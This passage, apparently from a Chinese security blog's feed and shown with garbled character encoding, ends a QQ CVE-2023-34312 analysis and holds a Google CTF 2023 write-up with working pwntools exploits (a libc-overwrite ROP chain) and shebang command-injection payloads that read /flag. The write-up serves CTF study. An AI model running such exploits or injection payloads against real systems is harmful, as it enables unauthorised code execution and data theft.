invoke__">PCWSTR</span>(HSTRING::<span class="title function_ invoke__">from</span>(qqprotectengine_dll.<span class="title function_ invoke__">as_path</span>()).<span class="title function_ invoke__">as_ptr</span>()), HANDLE::<span class="title function_ invoke__">default</span>(), DONT_RESOLVE_DLL_REFERENCES).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">base</span> = h.<span class="number">0</span> <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line">        <span class="title function_ invoke__">FreeLibrary</span>(h);</span><br><span class="line">        <span class="keyword">return</span> base;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºIPCè¿›ç¨‹é—´é€šè®¯</p><p>å¦‚ä½•æ‰¾åˆ°IPCé€šè®¯ï¼Œå¯ä»¥åœ¨<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist%E5%AE%89%E8%A3%85%60pipelist%60%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%9A%84%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E9%80%9A%E8%AE%AF">https://learn.microsoft.com/en-us/sysinternals/downloads/pipelistå®‰è£…`pipelist`æŸ¥çœ‹æ‰€æœ‰çš„å‘½åç®¡é“é€šè®¯</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716221331756.png" alt="image-20230716221331756" /></p><p>é‚£ä¹ˆåœ¨<code>QQProtect.exe</code>ä¸€å®šä¼šæœ‰ä¸€ä¸ªè¿æ¥å‘½åç®¡é“çš„åœ°æ–¹ï¼Œåœ¨<code>QQProtectEnginee.dll</code>ä¸­ä½¿ç”¨</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230155905.png" alt="image-20230716230155905" /></p><p>æ‰¾åˆ°å¯¹åº”çš„ç®¡é“å‘½å</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230225143.png" alt="image-20230716230225143" /></p><p>å’Œ</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716232640237.png" alt="image-20230716232640237" /></p><p>ï¼ˆå›è°ƒåˆ†æéº»äº†ï¼‰ä¹‹åä¼šè¿›å…¥QSection.dllä¸­çš„å‡½æ•°ï¼Œå…·ä½“é€†å‘å¯ä»¥çœ‹Bæˆ˜å¤§ä½¬çš„è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1wm4y1E7TL">https://www.bilibili.com/video/BV1wm4y1E7TL</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230717091525707.png" alt="image-20230717091525707" /></p><p>å¾ˆåƒä¸€ä¸ªç»“æ„ä½“ã€‚åŠ è½½äº†<code>QPSection</code>åè°ƒç”¨äº†6å·å¯¼å‡ºå‡½æ•°ï¼Œä¹‹åè¿˜éœ€è¦å¯¹ç»“æ„ä½“è¿›è¡Œé€†å‘</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å…³äºQQææƒæ¼æ´CVE-2023-34312çš„åˆ†æ&lt;/p&gt;
&lt;p&gt;ï¼ï¼æœªå®Œå¾…ç»­ï¼ï¼&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ã€CTFã€‘2023 Google CTF WriteUpä¸å¤ç°</title>
    <link href="https://joe1sn.eu.org/2023/06/26/googleCTF-wp/"/>
    <id>https://joe1sn.eu.org/2023/06/26/googleCTF-wp/</id>
    <published>2023-06-26T15:44:49.000Z</published>
    <updated>2023-06-27T12:28:50.376Z</updated>
    
    <content type="html"><![CDATA[<p>ç«¯åˆèŠ‚æ‰“çš„æ¯”èµ›ï¼Œäº‹æƒ…æ¯”è¾ƒå¤šæ²¡æ€ä¹ˆçœ‹é¢˜ï¼ŒæŒ‡å¯¼å­¦å¼Ÿåšäº†ä¸‹ï¼Œè¿™é‡Œæ¥ä¸ªå¤ç›˜ã€‚</p><p>å¼€å§‹CTFçš„å¤å¥ä¹‹è·¯å§ã€‚</p><span id="more"></span><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h1><h2 id="write-flag-where"><a class="markdownIt-Anchor" href="#write-flag-where"></a> WRITE-FLAG-WHERE</h2><p>æœ€ç®€å•çš„ä¸€é“pwnï¼Œæ²¡æœ‰å¼€ASLRä¿æŠ¤ã€‚å½“æ—¶æˆ‘çš„æœºå™¨è·‘ä¸èµ·æ¥ï¼Œå­¦å¼Ÿçš„èƒ½è·‘ï¼Œå’Œä»–ä¸€èµ·åˆ†æã€‚</p><p>ç¨‹åºçš„ä¸»é€»è¾‘æ˜¯è¯»å–<code>/proc/self/maps</code>æ¥è¯»å–å­˜åœ¨çš„å†…å­˜ï¼ˆgdbä¸­çš„vmmapå°±æ˜¯è¿™æ ·å®ç°çš„ï¼‰ï¼Œç„¶åæŠŠ <strong>flag</strong> è¯»å–åˆ°ä¸€ä¸ªå…¨å±€å˜é‡ä¸­ï¼Œæœ€åæˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„ä¸€ä¸ªåœ°å€<strong>å†™å…¥</strong>ä»»æ„é•¿åº¦ï¼ˆ<code>&lt;0x7f</code>ï¼‰çš„<code>flag</code>ä¸­çš„å­—ç¬¦ä¸²ã€‚</p><p>å½“æ—¶æˆ‘ä»¬æ˜¯åœ¨archä¸Šåšçš„ï¼Œä½¿ç”¨gdbèƒ½çœ‹åˆ°è¾“å‡ºï¼Œç„¶åå°è¯•å°†flagè¦†ç›–å†…å­˜ä¸­çš„æç¤ºè¯­å¥</p><p><img src="https://img.joe1sn.top/uploads/big/db64be7c974c4b8874990bf43ad75d96.png" alt="image-20230626235900892" /></p><p>é‚£ä¹ˆåœ°å€å°±æ˜¯ <code>*$rebase(0x21E0)</code>ï¼Œå°è¯•è¿œç¨‹</p><p><img src="https://img.joe1sn.top/uploads/big/7e185357a6df34bb8a05fe88e2715475.png" alt="image-20230627000119117" /></p><p>å¾—åˆ°flag</p><blockquote><p>CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}</p></blockquote><h2 id="write-flag-where-2"><a class="markdownIt-Anchor" href="#write-flag-where-2"></a> WRITE-FLAG-WHERE 2</h2><p>å½“æ—¶ç¦»åšå‡ºæ¥å·®äº†äº¿ç‚¹ç‚¹ã€‚</p><p>ä¿æŠ¤æ²¡å˜ï¼Œä½†æ˜¯åˆ é™¤äº†ä¹‹å‰çš„å­—ç¬¦ä¸²ä¿®æ”¹ç‚¹ã€‚åæ¥æˆ‘çœ‹åˆ°äº†æœ‰ä¸€æ®µæ— å…³çš„ä»£ç æ®µ</p><p><img src="https://img.joe1sn.top/uploads/big/aceaa896af8bd2be3eee5d25bceb04c8.png" alt="image-20230627000724135" /></p><p>åæ¥æƒ³è¿™é“é¢˜å¿«æƒ³é­”æ€”äº†</p><h3 id="æœªè§£å‡ºä½¿ç”¨sscanfè¦†ç›–"><a class="markdownIt-Anchor" href="#æœªè§£å‡ºä½¿ç”¨sscanfè¦†ç›–"></a> ã€æœªè§£å‡ºã€‘ä½¿ç”¨sscanfè¦†ç›–</h3><p><img src="https://img.joe1sn.top/uploads/big/0e87335c869798bc686b697a732f6b20.png" alt="image-20230627000846031" /></p><p>æŒºç–¯ç‹‚çš„ä¸€ä¸ªæƒ³æ³•ï¼Œç”±äºæ­»å¾ªç¯å†…ä¸å­˜åœ¨è¾“å…¥ï¼Œä½†æ˜¯sscanfä¼šæ ¹æ®ä½ çš„è¾“å…¥å»åŒ¹é…ï¼Œç„¶åæˆ‘ä»¬åˆçŸ¥é“flagæ˜¯<code>CTF&#123;xxxx&#125;</code>ï¼Œæ‰€ä»¥å¯ä»¥è¦†ç›–<code>0x%llx %u</code>çš„ç¬¬ä¸€ä¸ªï¼Œç±»ä¼¼äºï¼š</p><p><img src="https://img.joe1sn.top/uploads/big/44c200a9d509624944d2043e3844fd92.png" alt="image-20230627001051107" /></p><p>é€æ­¥ç¼©å°åœ°å€çˆ†ç ´å¾—åˆ°flagï¼Œä½†æ˜¯è€ƒè™‘åˆ°å·¥ä½œé‡è€Œä¸”å¤ªä¹…æ²¡åšCTFå¯¼è‡´pwntoolsçš„ä¸ç†Ÿæ‚‰æ²¡æœ‰èƒ½æˆåŠŸ</p><h3 id="å·®ä¸€ç‚¹å¯è§†åŒ–shellcode"><a class="markdownIt-Anchor" href="#å·®ä¸€ç‚¹å¯è§†åŒ–shellcode"></a> ã€å·®ä¸€ç‚¹ã€‘å¯è§†åŒ–shellcode</h3><p>å’Œä¸Šé¢çš„æ€è·¯å·®ä¸å¤šï¼Œåªä¸è¿‡æ˜¯åˆ©ç”¨äº†<code>T</code>çš„ASCIIä¸º<code>0x54</code>ï¼Œè€Œ<code>0x54</code>çš„æ±‡ç¼–ç æ˜¯<code>push rsp</code>ï¼Œé‚£ä¹ˆä¸€ç›´å†™å…¥<code>T</code>ï¼Œè®©æœ€åçš„é€€å‡ºåˆ’å…¥é‚£æ®µä¸ç›¸å…³çš„ä»£ç æ®µ</p><p><img src="https://img.joe1sn.top/uploads/big/c680a99fbe9de70f0ceb090c72232757.png" alt="image-20230627001337193" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">nop2</span>(<span class="params">addr,lenth</span>):</span><br><span class="line">  r.sendline(<span class="string">b&quot;0x%x %d&quot;</span> % (addr+base,lenth))</span><br><span class="line">  sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">nop2(<span class="number">0x20d5</span>,<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    nop2(<span class="number">0x1443</span>-i,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;0x1234 111111&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7092af8c58cfd633f124fae3ad84d73a.png" alt="image-20230627015659635" /></p><p>æœ€åå¾—åˆ°flag</p><blockquote><p>CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?}</p></blockquote><p><strong>æ³¨æ„ï¼šç”±äºç½‘ç»œå»¶æ—¶æœ€åçš„flagä¸å¼€ä»£ç†å¯¼è‡´æ²¡æœ‰æ”¶åˆ°â€¦</strong></p><h2 id="write-flag-where-3"><a class="markdownIt-Anchor" href="#write-flag-where-3"></a> WRITE-FLAG-WHERE 3</h2><p>ä¸Šä¸€é“é¢˜ç›´æ¥å¯¼è‡´å¿ƒæ€çˆ†ç‚¸ï¼Œè¿™é“é¢˜æ²¡æ€ä¹ˆçœ‹ã€‚ä¸è¿‡çœ‹ä¸Šå»é™åˆ¶äº†æˆ‘ä»¬èƒ½ä¿®æ”¹çš„åœ°å€èŒƒå›´ <strong>ä¸èƒ½</strong> æ˜¯<code>main</code>å‡½æ•°Â±<code>0x5000</code>çš„ä½ç½®ï¼Œå¯¼è‡´ä¹‹å‰çš„expå¤±æ•ˆã€‚</p><p><img src="https://img.joe1sn.top/uploads/big/e5d935cfb2c1e29b8fb6f314e69cf4b1.png" alt="image-20230627011217278" /></p><p>ä¸è¿‡æœ¬åœ°patchedè¿‡çš„ç‰ˆæœ¬æˆåŠŸè°ƒç”¨äº†<code>alarm</code></p><p><img src="https://img.joe1sn.top/uploads/big/7eb896172074ac45b77a71ffa43d81af.png" alt="image-20230627013114680" /></p><p>é‚£ä¹ˆè¯•è¯•ä¿®æ”¹libcä¸­çš„æŠ¥é”™ä¸ºflagï¼Œä½†æ˜¯ä¸è¡Œ</p><p>ä¸è¿‡æ€è·¯ä¹Ÿæ˜¯å¾ˆæ¥è¿‘çš„äº†ï¼Œåœ¨å®˜æ–¹çš„expä¸­ä½¿ç”¨äº†<code>&#125;</code>ï¼Œä½œä¸º<code>jnp</code>æ¥è¿›è¡Œçˆ†ç ´ã€‚å…¶ä»–ä¹Ÿæ˜¯ä½¿ç”¨äº†ä¸€ä¸‹gadgetï¼Œåˆ©ç”¨<code>jnp 0x48</code>å®ç°ROPçš„è·³è½¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 </span><br><span class="line">push r12</span><br><span class="line">jnp 0x48</span><br><span class="line">push rsp</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨2ä¸­çš„æ€è·¯è¦†å†™libcä¸­çš„<code>exit</code></li><li>ç”±äºè¾“å…¥ä½äºæ ˆä¸Šä½¿ç”¨ï¼Œè¾“å…¥ç»„åˆçš„ROPé“¾ï¼Œç”±äºlibcä¸­çš„<code>exit</code>å·²ç»è¢«è¦†å†™ï¼Œæ‰€ä»¥ç¨‹åºä¼šè¿”å›<code>ret</code>ï¼Œä»è€Œè§¦å‘ROPé“¾ï¼Œæœ€åå®ç°writeå†™å‡ºflag</li></ol><p>è¿™é‡Œä½¿ç”¨r3kpigçš„expæ‰“ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment"># p=process(&#x27;./main&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment"># exit(1)</span></span><br><span class="line">sh=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x555555555478</span></span><br><span class="line"><span class="string">b *0x555555555491</span></span><br><span class="line"><span class="string">b exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./chal&quot;)</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./chal&quot;,sh,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;wfw3.2023.ctfcompetition.com&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">addr,l</span>):</span><br><span class="line">    target = addr</span><br><span class="line">    pay = <span class="built_in">hex</span>(target).encode()+<span class="string">b&quot; &quot;</span>+<span class="built_in">str</span>(l).encode()</span><br><span class="line">    p.send(pay.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>(<span class="params">l</span>):</span><br><span class="line">    p.send(flat(l).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\xff&#x27;</span>))</span><br><span class="line">    p.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>(<span class="params">addr,l</span>):</span><br><span class="line">    <span class="keyword">if</span> l%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">        l=l-<span class="number">1</span></span><br><span class="line">        ch(addr+l-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l,<span class="number">2</span>):</span><br><span class="line">        ch(addr+x,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot; expire\n&quot;</span>)</span><br><span class="line">PIE = <span class="built_in">int</span>(p.readuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>],<span class="number">0x10</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(PIE))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ru(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.readuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>],<span class="number">0x10</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(base))</span><br><span class="line">ru(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x1b</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x17</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x2b</span>-<span class="number">3</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x2b</span>-<span class="number">2</span>+base,<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x1f</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x4</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x26</span>+base,<span class="number">1</span>)</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+base</span><br><span class="line">bprintf = <span class="number">0x555555555090</span>-<span class="number">0x555555554000</span>+PIE</span><br><span class="line">flag = <span class="number">0x5555555590A0</span>-<span class="number">0x555555554000</span>+PIE</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+base</span><br><span class="line">end([rdi,<span class="number">1337</span>,rsi,flag,bprintf,])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e2081c94cb03b32fa99c47d9a7d79102.png" alt="image-20230627020446490" /></p><p>å¾—åˆ°flag</p><blockquote><p>CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!}</p></blockquote><h2 id="storygen"><a class="markdownIt-Anchor" href="#storygen"></a> STORYGEN</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯pythonæ–‡ä»¶ã€‚</p><p>å‘ç°ä½¿ç”¨äº†<code>os.system(&quot;/tmp/script.sh&quot;)</code>ï¼Œé‚£ä¹ˆé¡ºç€é€»è¾‘å»åˆ†æï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#@NAME&#x27;s story</span></span><br><span class="line"></span><br><span class="line">NAME=<span class="string">&#x27;@NAME&#x27;</span></span><br><span class="line">WHERE=<span class="string">&#x27;@WHERE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$NAME</span> came from <span class="variable">$WHERE</span>. They always liked living there.&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;They had 3 pets:&quot;</span></span><br><span class="line"></span><br><span class="line">types[0]=<span class="string">&quot;dog&quot;</span></span><br><span class="line">types[1]=<span class="string">&quot;cat&quot;</span></span><br><span class="line">types[2]=<span class="string">&quot;fish&quot;</span></span><br><span class="line"></span><br><span class="line">names[0]=<span class="string">&quot;Bella&quot;</span></span><br><span class="line">names[1]=<span class="string">&quot;Max&quot;</span></span><br><span class="line">names[2]=<span class="string">&quot;Luna&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1 2 3</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  size1=<span class="variable">$&#123;#types[@]&#125;</span></span><br><span class="line">  index1=$((<span class="variable">$RANDOM</span> % <span class="variable">$size1</span>))</span><br><span class="line">  size2=<span class="variable">$&#123;#names[@]&#125;</span></span><br><span class="line">  index2=$((<span class="variable">$RANDOM</span> % <span class="variable">$size2</span>))</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;- a <span class="variable">$&#123;types[$index1]&#125;</span> named <span class="variable">$&#123;names[$index2]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Well, I&#x27;m not a good writer, you can write the rest... Hope this is a good starting point!&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;If not, try running the script again.&quot;</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¾“å…¥æ›¿æ¢è¿™æ®µè„šæœ¬</p><p><code>open(&quot;/tmp/script.sh&quot;, &quot;w&quot;).write(STORY.replace(&quot;@NAME&quot;, name).replace(&quot;@WHERE&quot;, where).strip())</code></p><p>ä¸è¿‡å­˜åœ¨å°WAF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def sanitize(s):</span><br><span class="line">  return s.replace(&quot;&#x27;&quot;, &#x27;&#x27;).replace(&quot;\n&quot;, &quot;&quot;)</span><br></pre></td></tr></table></figure><p>é¦–è¦æ€è·¯è‚¯å®šæ˜¯å‘½ä»¤æ³¨å…¥ï¼Œè€Œä¸”åœ¨é¦–è¡Œçš„<code>#@NAME's story</code>è‡ªå¸¦äº†ä¸€ä¸ª<code>'</code>ï¼Œå¦‚æœä½ å¯¹shellè„šæœ¬æ¯”è¾ƒäº†è§£çš„è¯ï¼Œä¼šçŸ¥é“å¾€å¾€æ˜¯ä»¥<code>#!/bin/bash</code>å¼€å§‹çš„ï¼Œå°è¯•ä¸€ä¸‹</p><p><img src="https://img.joe1sn.top/uploads/big/18571bac12cc614f607cd20862a46b1f.png" alt="image-20230627151715441" /></p><p>æˆåŠŸè°ƒç”¨äº†<code>/bin/bash</code>ã€‚èµ›åçœ‹wpå‘ç°è¿™ä¸ªæ˜¯Shebangï¼ˆä¹Ÿç§°ä¸ºHashbangï¼‰ï¼Œæ˜¯ä¸€ç§åœ¨Unixå’Œç±»Unixç³»ç»Ÿä¸­ç”¨äºæŒ‡å®šè„šæœ¬è§£é‡Šå™¨çš„çº¦å®šï¼Œå®ƒæ˜¯é€šè¿‡åœ¨è„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä»¥ç‰¹å®šæ ¼å¼æŒ‡å®šè§£é‡Šå™¨çš„è·¯å¾„æ¥å®ç°çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼ç›´æ¥<code>./hello.py</code>ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4944fab6a0bb179de51e928c69c29c23.png" alt="image-20230627195529980" /></p><p><img src="https://img.joe1sn.top/uploads/big/96ed2e42f64be4acff42ad1b1e4a0432.png" alt="image-20230627195549157" /></p><p>é‚£ä¹ˆå¼€å§‹æ„é€ expï¼Œ<strong>éœ€è¦æ³¨æ„çš„æ˜¯å°½é‡ä½¿ç”¨\x00æˆªæ–­</strong></p><p>å®˜æ–¹wpä¸­ä»‹ç»äº†ä¸€ç§æŠ€å·§ï¼š<code>#!/bin/cat&lt;ç©ºæ ¼&gt;</code>çš„æ—¶å€™ä¼šè¯»å–è‡ªèº«è„šæœ¬çš„å†…å®¹ï¼Œé¦–å…ˆä½¿ç”¨<code>ls -al</code>æŸ¥çœ‹ç›®å½•ï¼Œæœ€åæ’æŸ¥åˆ°æ ¹ç›®å½•</p><p><code>'!/usr/bin/env -S ls -al /\x00'</code></p><p><img src="https://img.joe1sn.top/uploads/big/70f72605e3119997fed33bbee578c2f6.png" alt="image-20230627202031628" /></p><p>å°è¯•è¯»å–flagï¼Œå‡ºç°æç¤º</p><p><code>!/usr/bin/env -S cat /flag\x00</code></p><p><img src="https://img.joe1sn.top/uploads/big/c8ff5f5b46e27c6c5fb4070cde62e062.png" alt="image-20230627202132139" /></p><p>å¾—åˆ°æç¤ºï¼Œæœ€åä½¿ç”¨payloadå¾—åˆ°flag</p><p><code>!/usr/bin/env -S sh -c &quot;/get_flag Give flag please&quot;\x00</code></p><p><img src="https://img.joe1sn.top/uploads/big/0656d0bf3c5b2b6e83166de03ceee2e1.png" alt="image-20230627202249168" /></p><blockquote><p>CTF{Sh3b4ng_1nj3cti0n_ftw}</p></blockquote><h2 id="ubf"><a class="markdownIt-Anchor" href="#ubf"></a> UBF</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;ç«¯åˆèŠ‚æ‰“çš„æ¯”èµ›ï¼Œäº‹æƒ…æ¯”è¾ƒå¤šæ²¡æ€ä¹ˆçœ‹é¢˜ï¼ŒæŒ‡å¯¼å­¦å¼Ÿåšäº†ä¸‹ï¼Œè¿™é‡Œæ¥ä¸ªå¤ç›˜ã€‚&lt;/p&gt;
&lt;p&gt;å¼€å§‹CTFçš„å¤å¥ä¹‹è·¯å§ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="writeup" scheme="https://joe1sn.eu.org/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://joe1sn.eu.org/tags/CTF/"/>
    
    <category term="writeup" scheme="https://joe1sn.eu.org/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>ã€å…æ€ã€‘C++å‡½æ•°è¿›åŒ–</title>
    <link href="https://joe1sn.eu.org/2023/06/26/cpp-function/"/>
    <id>https://joe1sn.eu.org/2023/06/26/cpp-function/</id>
    <published>2023-06-26T00:10:22.000Z</published>
    <updated>2023-06-26T15:41:34.611Z</updated>
    
    <content type="html"><![CDATA[<p>C++çš„å‡½æ•°è¿›åŒ–å°ç»“</p><span id="more"></span><h1 id="å‡½æ•°"><a class="markdownIt-Anchor" href="#å‡½æ•°"></a> å‡½æ•°</h1><p>æœ‰è¿™æ ·ä¸€ä¸ªé—®é¢˜</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> IntArray = &#123; <span class="number">12</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span 